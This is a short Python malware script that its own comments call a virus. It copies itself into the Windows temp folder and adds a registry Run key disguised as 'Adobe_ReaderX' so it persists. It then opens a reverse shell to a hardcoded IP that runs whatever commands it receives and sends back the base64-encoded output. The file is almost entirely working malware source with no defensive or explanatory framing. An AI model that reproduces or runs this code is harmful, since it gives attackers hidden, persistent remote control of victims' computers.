# Able to edit and hide into the registry through out the code execution and start the adverse effect on target system .. #!usr/bin/python 

import sys 
import base64 
import os 
import socket , subprocess
import winreg 
 
 
def autorun(tempdir, fileName, run):
# Copying  the executable to %TEMP%:
    os.system('copy %s %s'%(fileName, tempdir))
 
 
# Quering the  Windows registry for key values
# Appending  autorun key to runkey array

    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, run)
    runkey =[]
    try:
        i = 0
        while True:
            subkey = winreg.EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass
 
# Setting autorun key:

    if 'Adobe ReaderX' not in runkey:
        try:
            key= winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, run,0,winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key ,'Adobe_ReaderX',0,winreg.REG_SZ,r"%TEMP%\mw.exe")
            key.Close()
        except WindowsError:
            pass
            
def shell():
# malicious shellcode to be run from the windows registry give reverse connection to hacker computer
# hacker's ip is harcoded into the virus code ../

#Base64 encoded reverse shell

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.0.2.4', int(443))) # connection socket parameters as shown for now..
    s.send('[*] Connection Established!')
    while 1:
        data = s.recv(1024)
        if data == "quit": break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        encoded = base64.b64encode(stdout_value)
        s.send(encoded)
        #s.send(stdout_value)
    s.close()
 
def main():
    tempdir = '%TEMP%'
    fileName = sys.argv[0]
    run = "Software\Microsoft\Windows\CurrentVersion\Run" # 
    autorun(tempdir, fileName, run) # calling autorun function to start viral action .
    
    shell()
 
if __name__ == "__main__":
        main()
        
